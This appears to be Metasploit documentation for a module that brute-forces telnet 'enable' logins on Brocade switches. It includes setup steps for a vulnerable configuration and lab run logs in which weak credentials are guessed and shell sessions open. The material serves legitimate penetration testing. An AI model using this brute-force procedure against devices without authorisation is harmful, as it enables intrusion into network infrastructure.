## Vulnerable Application

  This module is a login bruteforcer against Brocade network device's `enable` feature.
  
To configure the device in a vulnerable fashion, follow these steps:
  1. Set authentication mode via: `aaa authentication enable default local`

This module works against `enable` so we want to ensure telnet itself has no auth
  **The following should not be set**: `enable telnet authentication`
  
This module has been verified against:
  1. ICX6450-24 SWver 07.4.00bT311
  2. FastIron WS 624 SWver 07.2.02fT7e1

An emulator is available [here](https://github.com/h00die/MSF-Testing-Scripts/blob/master/brocade_emulator.py)

## Verification Steps

  1. Install the emulator or device
  2. Start msfconsole
  3. Do: `use auxiliary/scanner/telnet/brocade_enable_login`
  4. Create/set a password file: `set pass_file /<passwords.lst>`
  5. If desired: `set user_as_pass true`
  6. Do: `set rhosts <ip>`
  7. Do: `run`
  8. You should get a shell.

## Scenarios

  Example run against ICX6450-24 SWver 07.4.00bT311

```
msf > use auxiliary/scanner/telnet/brocade_enable_login 
msf auxiliary(brocade_enable_login) > set pass_file /passwords.lst
pass_file => /passwords.lst
msf auxiliary(brocade_enable_login) > set user_as_pass true
user_as_pass => true
msf auxiliary(brocade_enable_login) > set rhosts 192.168.50.1
rhosts => 192.168.50.1
msf auxiliary(brocade_enable_login) > run

[*]  Attempting username gathering from config on 192.168.50.1
[*]    Found: admin@192.168.50.1
[*]    Found: read@192.168.50.1
[*]    Found: port@192.168.50.1
[*]  Attempting username gathering from running-config on 192.168.50.1
[*]    Found: admin@192.168.50.1
[*]    Found: read@192.168.50.1
[*]    Found: port@192.168.50.1
[+] 192.168.50.1:23 - LOGIN SUCCESSFUL: admin:admin
[*] Attempting to start session 192.168.50.1:23 with admin:admin
[*] Command shell session 1 opened (192.168.50.2:57524 -> 192.168.50.1:23) at 2015-03-06 20:19:41 -0500
[-] 192.168.50.1:23 - LOGIN FAILED: read:admin (Incorrect: )
[+] 192.168.50.1:23 - LOGIN SUCCESSFUL: read:read
[*] Attempting to start session 192.168.50.1:23 with read:read
[*] Command shell session 2 opened (192.168.50.2:49223 -> 192.168.50.1:23) at 2015-03-06 20:20:32 -0500
[-] 192.168.50.1:23 - LOGIN FAILED: port:read (Incorrect: )
[+] 192.168.50.1:23 - LOGIN SUCCESSFUL: port:port
[*] Attempting to start session 192.168.50.1:23 with port:port
[*] Command shell session 3 opened (192.168.50.2:34683 -> 192.168.50.1:23) at 2015-03-06 20:21:23 -0500
[-] 192.168.50.1:23 - LOGIN FAILED: admin:port (Unable to Connect: )
[-] 192.168.50.1:23 - LOGIN FAILED: admin:admin (Unable to Connect: )
[-] 192.168.50.1:23 - LOGIN FAILED: admin:12345678 (Unable to Connect: )
[-] 192.168.50.1:23 - LOGIN FAILED: read:port (Unable to Connect: )
[-] 192.168.50.1:23 - LOGIN FAILED: read:read (Unable to Connect: )
[-] 192.168.50.1:23 - LOGIN FAILED: read:12345678 (Unable to Connect: )
[-] 192.168.50.1:23 - LOGIN FAILED: port:port (Unable to Connect: )
[-] 192.168.50.1:23 - LOGIN FAILED: port:port (Unable to Connect: )
[-] 192.168.50.1:23 - LOGIN FAILED: port:12345678 (Unable to Connect: )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(brocade_enable_login) > sessions -l

Active sessions
===============

  Id  Type    Information                           Connection
  --  ----    -----------                           ----------
  1   shell   TELNET admin:admin (192.168.50.1:23)  192.168.50.2:57524 -> 192.168.50.1:23 (192.168.50.1)
  2   shell   TELNET read:read (192.168.50.1:23)    192.168.50.2:49223 -> 192.168.50.1:23 (192.168.50.1)
  3   shell   TELNET port:port (192.168.50.1:23)    192.168.50.2:34683 -> 192.168.50.1:23 (192.168.50.1)

msf auxiliary(brocade_enable_login) > session -i 1
[-] Unknown command: session.
msf auxiliary(brocade_enable_login) > sessions -i 1
[*] Starting interaction with 1...

show sessions ?
Unrecognized command
BR-telnet@FWS624 Router#show ?
  802-1w                 Rapid Spanning tree IEEE 802.1w D10 status
  aaa                    Show TACACS+ and RADIUS server statistics
  access-list            show IPv4 access-list information
  acl-on-arp             Show ARP ACL filtering
  arp                    Arp table
  auth-mac-addresses     MAC Authentication status
  batch                  Batch commands
  boot-preference        System boot preference
  buffer-profile         Displays active profile
  cable-diagnostics      Show Cable Diagnostics
  chassis                Power supply/fan/temperature
  clock                  System time and date
  configuration          Configuration data in startup config file
  cpu-utilization        CPU utilization rate
  debug                  Debug information
  default                System default settings
  dot1x                  Dot1x information
  errdisable             Errdisable status
  fdp                    CDP/FDP information
  flash                  Flash memory contents
  gvrp                   GVRP information
  inline                 inline power information
  interfaces             Port status
--More--, next page: Space, next line: Return key, quit: Control-c 
  ip                     IP address setting
  ipv6                   IP setting
  license                Show license information
  link-aggregate         802.3ad Link Aggregation Information
  link-error-disable     Link Debouncing Control
  link-keepalive         Link Layer Keepalive
  lldp                   Link-Layer Discovery Protocol information
  local-userdb           Local User Database information
  logging                System log
  loop-detection         loop detection status & disabled ports
  mac-address            MAC address table
  media                  1Gig/10G port media type
  memory                 System memory usage
  metro-ring             Metro ring protocol information
  mirror                 Mirror ports
  module                 Module type and status
  monitor                Monitor ports
  mstp                   show MSTP (IEEE 802.1s) information
  optic                  Optic Temperature and Power
  port                   Show port security
  priority-mapping       802.1Q tagged priority setting
  processes              Active process statistics
  protected-link-group   Show Protected Link Group Details
--More--, next page: Space, next line: Return key, quit: Control-c 
  ptrace                 Global ptrace information
  qd-buffer-profile      User configured buffer/descriptor profiles
  qos-profiles           QOS configuration
  qos-tos                IPv4 ToS based QoS
  radius                 show radius server debug info
  rate-limit             Rate-limiting table and actions
  redundancy             Display management redundancy details
  relative-utilization   Relative utilization list
  reload                 Scheduled system reset
  reserved-vlan-map      Reserved VLAN map status
  rmon                   Rmon status
  running-config         Current running-config
  scheduler-profile      User configured scheduling profiles
  sflow                  sFlow information
  snmp                   SNMP statistics
  sntp                   Show SNTP
  span                   Spanning tree status
  statistics             Packet statistics
  stp-bpdu-guard         BPDU Guard status
  stp-group              Spanning Tree Group Membership
  stp-protect-ports      Show stp-protect enabled ports and their BPDU drop
                         counters
  table-mac-vlan         MAC Based VLAN status
--More--, next page: Space, next line: Return key, quit: Control-c 
  tech-support           System snap shot for tech support
  telnet                 Telnet connection
  topology-group         Topology Group Membership
  traffic-policy         Show traffic policy definition
  trunk                  Show trunk status
  users                  User accounts
  v6-l4-acl-sessions     Show IPv6 software sessions
  version                System status
  vlan                   VLAN status
  vlan-group             VLAN Group Membership
  voice-vlan             Show voice vlan
  vsrp                   Show VSRP commands
  web-connection         Current web connections
  webauth                web authentication information
  who                    User login
  |                      Output modifiers
  <cr>
BR-telnet@FWS624 Router#
```

  Example run against emulator mentioned above:

```
msf > use auxiliary/scanner/telnet/brocade_enable_login 
msf auxiliary(brocade_enable_login) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf auxiliary(brocade_enable_login) > set user_as_pass true
user_as_pass => true
msf auxiliary(brocade_enable_login) > set pass_file /passwords.lst
pass_file => /passwords.lst
msf auxiliary(brocade_enable_login) > run

[*]  Attempting username gathering from config on 127.0.0.1
[*]    Found: username@127.0.0.1
[*]    Found: ttrogdon@127.0.0.1
[*]    Found: dmudd@127.0.0.1
[*]  Attempting username gathering from running-config on 127.0.0.1
[*]    Found: TopDogUser@127.0.0.1
[-] 127.0.0.1:23 - LOGIN FAILED: username:username (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: username:12345678 (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: username:123456 (Incorrect: )
[+] 127.0.0.1:23 - LOGIN SUCCESSFUL: username:password
[*] Attempting to start session 127.0.0.1:23 with username:password
[*] Command shell session 1 opened (127.0.0.1:60089 -> 127.0.0.1:23) at 2015-03-06 20:05:57 -0500
[-] 127.0.0.1:23 - LOGIN FAILED: ttrogdon:password (Incorrect: )
[+] 127.0.0.1:23 - LOGIN SUCCESSFUL: ttrogdon:ttrogdon
[*] Attempting to start session 127.0.0.1:23 with ttrogdon:ttrogdon
[*] Command shell session 2 opened (127.0.0.1:33204 -> 127.0.0.1:23) at 2015-03-06 20:06:47 -0500
[-] 127.0.0.1:23 - LOGIN FAILED: dmudd:ttrogdon (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: dmudd:dmudd (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: dmudd:12345678 (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: dmudd:123456 (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: dmudd:password (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: dmudd:passwords (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: dmudd:ports (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: dmudd:admin (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: dmudd:read (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: TopDogUser:ttrogdon (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: TopDogUser:TopDogUser (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: TopDogUser:12345678 (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: TopDogUser:123456 (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: TopDogUser:password (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: TopDogUser:passwords (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: TopDogUser:ports (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: TopDogUser:admin (Incorrect: )
[-] 127.0.0.1:23 - LOGIN FAILED: TopDogUser:read (Incorrect: )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(brocade_enable_login) > sessions -l

Active sessions
===============

  Id  Type    Information                              Connection
  --  ----    -----------                              ----------
  1   shell   TELNET username:password (127.0.0.1:23)  127.0.0.1:60089 -> 127.0.0.1:23 (127.0.0.1)
  2   shell   TELNET ttrogdon:ttrogdon (127.0.0.1:23)  127.0.0.1:33204 -> 127.0.0.1:23 (127.0.0.1)

msf auxiliary(brocade_enable_login) >
```